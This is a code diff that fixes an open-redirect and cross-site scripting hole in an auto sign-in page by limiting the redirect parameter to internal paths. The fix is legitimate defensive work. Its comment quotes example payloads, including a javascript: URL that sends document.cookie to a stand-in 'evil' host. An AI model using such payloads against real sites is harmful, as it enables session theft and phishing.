@@ -77,7 +77,14 @@ function verifyOneTapToken(token: string): any {
  * No app code changes required on the client.
  */
 function autoSignHtml(opts: { customToken: string; redirect?: string }) {
-  const redirect = opts.redirect || "/m";
+  // SECURITY 2026-06-25: `redirect` reaches location.replace() on a page that JUST
+  // minted an authenticated session cookie. The query param was unchecked, so
+  // ?redirect=https://evil.com (phishing) or ?redirect=javascript:fetch('//evil/'+
+  // document.cookie) (XSS / session theft) both worked. Allowlist to an INTERNAL
+  // relative path only: must start with a single "/", no "//" (protocol-relative),
+  // no scheme/colon. Anything else falls back to the safe default.
+  const rawRedirect = opts.redirect || "/m";
+  const redirect = /^\/(?!\/)[A-Za-z0-9/_\-?=&.%#]*$/.test(rawRedirect) ? rawRedirect : "/m";
   const apiKey = FIREBASE_API_KEY;
   const authDomain = FIREBASE_AUTH_DOMAIN;
   const projectId = FIREBASE_PROJECT_ID;
